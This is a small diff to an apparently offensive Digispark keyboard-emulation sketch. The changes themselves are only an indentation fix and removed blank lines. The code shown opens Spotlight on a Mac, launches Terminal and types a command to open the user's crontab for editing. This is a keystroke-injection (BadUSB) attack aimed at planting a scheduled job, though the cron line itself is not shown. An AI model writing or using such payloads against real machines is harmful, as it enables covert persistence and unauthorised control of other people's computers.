@@ -8,7 +8,7 @@ void loop() {
   DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_GUI_LEFT);
   DigiKeyboard.delay(600);
   DigiKeyboard.print("terminal");
- DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(5000);
   DigiKeyboard.print("export VISUAL=nano; crontab -e");
   DigiKeyboard.delay(500);
@@ -27,5 +27,3 @@ void loop() {
   DigiKeyboard.delay(500);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
 for(;;){ /*empty*/ }}
-
-
